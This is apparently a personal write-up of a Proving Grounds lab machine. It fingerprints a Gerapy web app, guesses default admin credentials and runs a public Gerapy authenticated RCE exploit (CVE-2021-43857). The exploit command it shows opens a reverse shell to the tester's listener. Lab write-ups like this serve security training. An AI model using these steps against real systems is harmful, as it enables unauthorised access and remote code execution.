**HyperText Transport Protocol**

# Environment Variables / Setup

```
export IP=192.168.159.24
export PORT=8000
export URL=http://$IP:$PORT
```

## Technology Stack Identification

### whatweb
```
whatweb $URL
```

```
WhatWeb report for http://192.168.159.24:8000
Status    : 200 OK
Title     : Gerapy
IP        : 192.168.159.24
Country   : RESERVED, ZZ

Summary   : Allow[GET, OPTIONS], HTML5, HTTPServer[WSGIServer/0.2 CPython/3.10.6], Script, X-UA-Compatible[IE=edge]

Detected Plugins:
[ Allow ]
	This plugin retrieves the allowed methods from the HTTP
	Allow header. - More info:
	http://en.wikipedia.org/wiki/List_of_HTTP_header_fields

	Module       : GET, OPTIONS

[ HTML5 ]
	HTML version 5, detected by the doctype declaration


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to
	identify the operating system from the server header.

	String       : WSGIServer/0.2 CPython/3.10.6 (from server string)

[ Script ]
	This plugin detects instances of script HTML elements and
	returns the script language/type.


[ X-UA-Compatible ]
	This plugin retrieves the X-UA-Compatible value from the
	HTTP header and meta http-equiv tag. - More Info:
	http://msdn.microsoft.com/en-us/library/cc817574.aspx

	String       : IE=edge

HTTP Headers:
	HTTP/1.1 200 OK
	Date: Fri, 22 Aug 2025 16:01:40 GMT
	Server: WSGIServer/0.2 CPython/3.10.6
	Content-Type: text/html; charset=utf-8
	Vary: Accept, Origin
	Allow: GET, OPTIONS
	Content-Length: 2530

```

Gerapy has a CVE for authenticated RCE that we might be able to use, though we haven't confirmed the version yet.
https://www.exploit-db.com/exploits/50640


![[Pasted image 20250822091455.png]]

Guessing admin:amin grants access.


At the bottom of the page, it lists the version as 9.7, so I'll check out this exploit.
https://github.com/LongWayHomie/CVE-2021-43857
https://www.exploit-db.com/exploits/50640

As the GitHub readme points out, the script fails without any projects, so we first need to create one in the admin console.

![[Pasted image 20250822152910.png]]

Then:
`python3 50640.py -t 192.168.159.24 -p 8000 -L 192.168.45.244 -P 1234`

and we have a shell! (The exploit script starts a netcat listener for us)


![[Pasted image 20250822153439.png]]


# Continue: [[Archive/OFFSEC - Proving Grounds Writeups/Linux/Levram/Privilege Escalation|Privilege Escalation]]

